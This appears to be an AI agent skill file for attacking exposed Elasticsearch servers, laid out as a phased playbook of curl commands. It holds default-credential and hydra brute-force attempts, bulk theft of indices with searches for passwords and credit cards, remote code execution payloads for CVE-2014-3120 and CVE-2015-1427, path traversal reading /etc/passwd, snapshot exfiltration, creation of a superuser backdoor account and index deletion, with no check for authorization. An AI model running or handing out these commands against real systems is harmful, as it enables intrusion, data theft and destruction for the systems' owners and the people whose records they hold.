---
name: elasticsearch-attack
description: "Elasticsearch unauthorized access and exploitation. Use when you find that a target exposes ports 9200/9300, that the Elasticsearch service has no authentication, or when you need to extract index data or achieve remote command execution. Covers unauthorized access, authentication bypass, index data theft, MVEL/Groovy script RCE (older versions), snapshot repository abuse, cluster information leakage, dynamic script injection, Ingest Pipeline abuse, and path traversal"
zh-signals: "Elasticsearch 未授权访问与利用技能，覆盖 9200/9300 探测、认证绕过、索引窃取与脚本 RCE。信号:Elasticsearch,未授权访问,认证绕过,索引窃取,脚本RCE"
when-to-use: "Use when a target exposes Elasticsearch on ports 9200/9300 without authentication, and you need to enumerate cluster data, bypass auth, steal indices, or test script-based RCE."
metadata:
  tags: "elasticsearch,es,9200,9300,unauthorized,rce,groovy,mvel,snapshot,ingest-pipeline,kibana,index"
  category: "exploit"
---

# Elasticsearch Unauthorized Access and Exploitation

Elasticsearch listens on port 9200 by default with no authentication, and when exposed to the network it faces a large amount of sensitive data leakage and potential RCE risk.

## ⛔ Further Reading (Must Read)
- Full exploitation commands and payloads → read [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 1: Service Discovery and Version Identification

### 1.1 Basic Probing

```bash
# Request the root path directly, it returns the cluster name and version number
curl http://TARGET:9200/

# Cluster health status
curl http://TARGET:9200/_cat/health?v
curl http://TARGET:9200/_cluster/health?pretty
```

### 1.2 Nmap Scanning

```bash
# HTTP service identification
nmap -sV -p 9200,9300 TARGET

# Generic HTTP fingerprint scripts; for detailed ES enumeration prefer the curl APIs below
nmap -p 9200 --script http-title,http-headers TARGET
```

**Key Decision**:
- The returned JSON contains `cluster_name` / `version.number` → no authentication, go directly to Phase 3
- 401 / 403 returned → authentication is enabled, go to Phase 2
- `version.number` < 1.2 → MVEL RCE is available (CVE-2014-3120)
- `version.number` 1.3.x - 1.4.x → Groovy sandbox escape RCE is available (CVE-2015-1427)
- `version.number` >= 5.x → focus on Painless scripts and Ingest Pipelines

---

## Phase 2: Unauthorized Access / Authentication Bypass Detection

### 2.1 Confirming the Absence of Authentication

```bash
# Access the core API endpoints directly
curl http://TARGET:9200/_cat/indices?v
curl http://TARGET:9200/_cluster/state?pretty
curl http://TARGET:9200/_nodes/stats?pretty
```

### 2.2 Default Credentials and X-Pack

```bash
# Common default credentials: elastic:changeme, elastic:elastic, admin:admin
curl -u elastic:changeme http://TARGET:9200/
curl -u elastic:elastic http://TARGET:9200/
curl -u admin:admin http://TARGET:9200/

# Check whether X-Pack Security is enabled
curl http://TARGET:9200/_xpack/security/user
curl http://TARGET:9200/_security/user

# Brute force
hydra -L users.txt -P passwords.txt TARGET http-get /_search
```

---

## Phase 3: Attack Decision Tree

```
Connection successful?
├─ ES < 1.2 → MVEL RCE (/_search + script filter, CVE-2014-3120)
├─ ES 1.3.x-1.4.x → Groovy sandbox escape RCE (CVE-2015-1427)
├─ ES < 1.4.3 + _plugin → path traversal to read files
├─ ES >= 6.x + no authentication → bulk index data export
│   ├─ _cat/indices lists all indices
│   ├─ _search + _scroll for bulk export
│   └─ Search sensitive fields (password, token, email, credit_card)
├─ Snapshot repository access → snapshot data theft/restoration
├─ Ingest Pipeline access → Pipeline injection (data modification)
├─ Dynamic script access → script storage and execution
├─ Kibana exposed → Kibana console exploitation
└─ Cluster admin access → configuration tampering / malicious user creation
```

**Preliminary Information Gathering**:

```bash
# Get the version number (determines the attack path)
curl -s http://TARGET:9200/ | grep number

# List all indices (judge the data scale)
curl http://TARGET:9200/_cat/indices?v

# Get the cluster settings
curl http://TARGET:9200/_cluster/settings?pretty

# Get all index mappings (understand the data structure)
curl http://TARGET:9200/_all/_mapping?pretty
```

---

## Phase 4: Data Theft Quick Reference

### 4.1 Index Enumeration

```bash
# List all indices
curl http://TARGET:9200/_cat/indices?v

# List all aliases
curl http://TARGET:9200/_aliases?pretty

# Get the index mapping (field structure)
curl http://TARGET:9200/INDEX_NAME/_mapping?pretty
```

### 4.2 Data Search and Export

```bash
# Search all data (returns 10 records by default)
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {"match_all": {}},
    "size": 1000
  }'

# Search sensitive fields
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "multi_match": {
        "query": "password",
        "fields": ["*"]
      }
    }
  }'
```

### 4.3 Large Data Volumes with the _scroll API

```bash
# Initialize the scroll
curl -X POST http://TARGET:9200/INDEX_NAME/_search?scroll=5m \
  -H 'Content-Type: application/json' -d '{
    "query": {"match_all": {}},
    "size": 5000
  }'

# Keep fetching (use the _scroll_id returned by the previous step)
curl -X POST http://TARGET:9200/_search/scroll \
  -H 'Content-Type: application/json' -d '{
    "scroll": "5m",
    "scroll_id": "SCROLL_ID_HERE"
  }'
```

→ Read [references/attack-techniques.md](references/attack-techniques.md) for the elasticdump bulk export commands

---

## Phase 5: RCE Quick Reference

### 5.1 MVEL Expression Injection (ES < 1.2, CVE-2014-3120)

```bash
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "filtered": {
        "query": {"match_all": {}},
        "filter": {
          "script": {
            "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getMethod(\"exec\",java.lang.Class.forName(\"java.lang.String\")).invoke(null,\"id\")"
          }
        }
      }
    }
  }'
```

### 5.2 Groovy Sandbox Escape (ES 1.3.x-1.4.x, CVE-2015-1427)

```bash
curl -X POST http://TARGET:9200/_search?pretty \
  -H 'Content-Type: application/json' -d '{
    "query": {
      "filtered": {
        "filter": {
          "script": {
            "script": "def proc = \"id\".execute(); proc.waitFor(); proc.text()"
          }
        }
      }
    }
  }'
```

### 5.3 Path Traversal (ES < 1.4.3)

```bash
curl http://TARGET:9200/_plugin/head/../../../../../../etc/passwd
curl http://TARGET:9200/_plugin/head/../../../../../../etc/elasticsearch/elasticsearch.yml
```

→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete RCE payloads

---

## Phase 6: Other Attack Vectors

### 6.1 Snapshot Repository Abuse

```bash
# Register a snapshot repository
curl -X PUT http://TARGET:9200/_snapshot/exfil_repo \
  -H 'Content-Type: application/json' -d '{
    "type": "fs",
    "settings": {"location": "/tmp/snapshots"}
  }'

# Create a snapshot
curl -X PUT http://TARGET:9200/_snapshot/exfil_repo/snap_1

# Restore the snapshot to a path reachable by the attacker
curl -X POST http://TARGET:9200/_snapshot/exfil_repo/snap_1/_restore
```

### 6.2 Ingest Pipeline Injection

```bash
# List the existing pipelines
curl http://TARGET:9200/_ingest/pipeline?pretty

# Create a malicious pipeline
curl -X PUT http://TARGET:9200/_ingest/pipeline/malicious \
  -H 'Content-Type: application/json' -d '{
    "description": "data interceptor",
    "processors": [
      {"set": {"field": "intercepted", "value": "true"}}
    ]
  }'
```

### 6.3 Cluster Configuration Tampering

```bash
# Create a backdoor user (requires X-Pack admin privileges)
curl -X POST http://TARGET:9200/_xpack/security/user/attacker \
  -H 'Content-Type: application/json' -d '{
    "password": "password123",
    "roles": ["superuser"]
  }'

# Delete an index
curl -X DELETE http://TARGET:9200/INDEX_NAME
```

→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete technical details

---

## Tool Quick Reference

| Tool | Purpose |
|------|------|
| curl | ES REST API interaction (the basis of all operations) |
| elasticsearch-head | Cluster administration web UI plugin |
| Kibana | ES data visualization and Dev Tools queries |
| elasticdump | Bulk index data export/import |
| nmap | Port scanning, service identification, and generic HTTP fingerprint scripts |
| hydra | HTTP authentication brute force |

---

## Notes

- All ES operations go through the REST API (HTTP); every command uses curl
- The `_scroll` API is more efficient than `_search` for large data exports and avoids pulling all the data at once
- RCE in older versions: MVEL works on ES < 1.2, Groovy sandbox escape works on ES 1.3.x-1.4.x, and both were removed in modern versions
- `_search?size=10000` has an upper limit; beyond that, use `_scroll` or `search_after`
- Deleting an index (`DELETE /index`) is irreversible — confirm the target before operating
- In production environments, avoid running full `match_all` queries on large indices; export in batches instead
